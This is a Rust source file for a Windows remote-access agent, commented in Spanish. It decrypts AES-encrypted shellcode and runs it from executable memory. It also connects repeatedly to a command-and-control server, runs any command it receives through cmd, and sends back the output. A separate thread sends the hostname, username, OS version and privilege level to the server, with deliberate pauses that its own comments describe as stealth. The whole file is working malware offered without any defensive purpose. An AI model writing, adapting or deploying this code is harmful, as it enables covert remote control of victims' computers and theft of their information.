#![windows_subsystem = "console"] // Para debug

mod config;

use aes::Aes256;
use cbc::{
    cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit},
    Decryptor,
};
use std::io::{BufRead, BufReader, Read, Write};
use std::mem::transmute;
use std::net::TcpStream;
use std::process::Command;
use std::ptr::copy;
use std::thread;
use std::time::Duration;
use winapi::shared::minwindef::DWORD;
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winbase::INFINITE;
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};

type Aes256CbcDec = Decryptor<Aes256>;

const DELIMITER: &str = "\n<<END>>\n";

fn decrypt_shellcode() -> Vec<u8> {
    println!("DEBUG: Desencriptando shellcode");
    let cipher = Aes256CbcDec::new_from_slices(config::KEY, config::IV).unwrap();
    let mut buffer = config::ENCRYPTED_SHELLCODE.to_vec();

    match cipher.decrypt_padded_mut::<Pkcs7>(&mut buffer) {
        Ok(decrypted) => {
            println!("DEBUG: Shellcode desencriptado: {} bytes", decrypted.len());
            decrypted.to_vec()
        }
        Err(e) => {
            println!("DEBUG: ❌ Error desencriptando: {:?}", e);
            vec![]
        }
    }
}

fn execute_shellcode() {
    println!("DEBUG: Ejecutando shellcode");
    unsafe {
        let shellcode = decrypt_shellcode();

        if shellcode.is_empty() {
            println!("DEBUG: Shellcode vacío, saltando ejecución");
            return;
        }

        let mem = VirtualAlloc(
            std::ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if mem.is_null() {
            println!("DEBUG: Error allocando memoria");
            return;
        }

        copy(shellcode.as_ptr(), mem.cast::<u8>(), shellcode.len());

        let func: extern "system" fn() -> DWORD = transmute(mem);
        let thread = CreateThread(
            std::ptr::null_mut(),
            0,
            Some(transmute(func as *const ())),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );

        if !thread.is_null() {
            WaitForSingleObject(thread, INFINITE);
        }
    }
}

fn get_system_info(info_type: &str) -> String {
    let output = match info_type {
        "hostname" => Command::new("hostname").output(),
        "username" => Command::new("cmd").args(&["/C", "echo %USERNAME%"]).output(),
        "os" => Command::new("cmd").args(&["/C", "ver"]).output(),
        "privileges" => Command::new("cmd")
            .args(&["/C", "net session >nul 2>&1 && echo Admin || echo User"])
            .output(),
        _ => return String::new(),
    };

    match output {
        Ok(out) => String::from_utf8_lossy(&out.stdout).trim().to_string(),
        Err(_) => "Unknown".to_string(),
    }
}

fn execute_command(cmd: &str) -> String {
    // Manejar ping silenciosamente (keep-alive)
    if cmd == "ping" {
        return "pong".to_string();
    }

    println!("DEBUG: Ejecutando comando: '{}'", cmd);

    if cmd == "exit" {
        std::process::exit(0);
    }

    let output = Command::new("cmd").args(&["/C", cmd]).output();

    match output {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);

            let result = if !stdout.is_empty() {
                stdout.to_string()
            } else if !stderr.is_empty() {
                format!("[ERROR]\n{}", stderr)
            } else {
                "[OK] Comando ejecutado sin salida".to_string()
            };

            println!("DEBUG: Resultado: {} bytes", result.len());
            result
        }
        Err(e) => {
            let error = format!("[ERROR] No se pudo ejecutar: {}", e);
            println!("DEBUG: {}", error);
            error
        }
    }
}

fn send_sysinfo(writer: &mut TcpStream, info_type: &str, tag: &str) -> Result<(), Box<dyn std::error::Error>> {
    println!("DEBUG: Recopilando {}", info_type);
    let info = get_system_info(info_type);
    let message = format!("__SYSINFO__{}::{}{}", tag, info, DELIMITER);
    writer.write_all(message.as_bytes())?;
    writer.flush()?;
    println!("DEBUG: Enviado {}: {}", info_type, info);
    Ok(())
}

fn handle_connection(stream: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
    println!("DEBUG: Conexión establecida");

    // Timeouts más largos para evitar desconexiones
    stream.set_read_timeout(Some(Duration::from_secs(300)))?; // 5 minutos
    stream.set_write_timeout(Some(Duration::from_secs(30)))?;
    stream.set_nodelay(true)?;

    let mut reader = BufReader::new(stream.try_clone()?);
    let mut writer = stream;

    // Thread para recopilación sigilosa de información del sistema
    let mut sysinfo_writer = writer.try_clone()?;
    thread::spawn(move || {
        // Esperar un poco después de conectar (parece actividad normal)
        thread::sleep(Duration::from_secs(8));
        let _ = send_sysinfo(&mut sysinfo_writer, "hostname", "HOSTNAME");
        
        // Esperar entre cada recopilación para ser sigiloso
        thread::sleep(Duration::from_secs(12));
        let _ = send_sysinfo(&mut sysinfo_writer, "username", "USERNAME");
        
        thread::sleep(Duration::from_secs(15));
        let _ = send_sysinfo(&mut sysinfo_writer, "os", "OS");
        
        thread::sleep(Duration::from_secs(10));
        let _ = send_sysinfo(&mut sysinfo_writer, "privileges", "PRIV");
    });

    loop {
        let mut command = String::new();

        println!("DEBUG: Esperando comando...");

        match reader.read_line(&mut command) {
            Ok(0) => {
                println!("DEBUG: Conexión cerrada por el servidor");
                return Err("Conexión cerrada".into());
            }
            Ok(n) => {
                println!("DEBUG: Recibidos {} bytes", n);
                let command = command.trim().to_string();

                if command.is_empty() {
                    continue;
                }

                println!("DEBUG: Comando: '{}'", command);

                let result = execute_command(&command);

                let response = format!("{}{}", result, DELIMITER);
                println!("DEBUG: Enviando {} bytes de respuesta", response.len());

                match writer.write_all(response.as_bytes()) {
                    Ok(_) => {
                        writer.flush()?;
                        println!("DEBUG: Respuesta enviada exitosamente");
                    }
                    Err(e) => {
                        println!("DEBUG: Error enviando respuesta: {}", e);
                        return Err(e.into());
                    }
                }
            }
            Err(e) => {
                // Distinguir entre timeout y error real
                if e.kind() == std::io::ErrorKind::WouldBlock 
                    || e.kind() == std::io::ErrorKind::TimedOut {
                    println!("DEBUG: Timeout en lectura, continuando...");
                    continue;
                }
                println!("DEBUG: Error leyendo comando: {}", e);
                return Err(e.into());
            }
        }
    }
}

fn connect_to_c2() {
    println!("DEBUG: Servidor C2: {}", config::C2_SERVER);

    loop {
        println!("DEBUG: Intentando conectar...");

        match TcpStream::connect(&config::C2_SERVER) {
            Ok(stream) => {
                println!("DEBUG: ✅ Conectado al C2");

                if let Err(e) = handle_connection(stream) {
                    println!("DEBUG: ❌ Error en conexión: {}", e);
                }
            }
            Err(e) => {
                println!("DEBUG: ❌ Error conectando: {}", e);
            }
        }

        println!("DEBUG: Reintentando en 5 segundos...");
        thread::sleep(Duration::from_secs(5));
    }
}

fn main() {
    println!("DEBUG: 🚀 Agente iniciado");
    println!("DEBUG: Servidor: {}", config::C2_SERVER);

    // Shellcode en hilo separado
    thread::spawn(|| {
        execute_shellcode();
    });

    thread::sleep(Duration::from_secs(2));

    connect_to_c2();
}
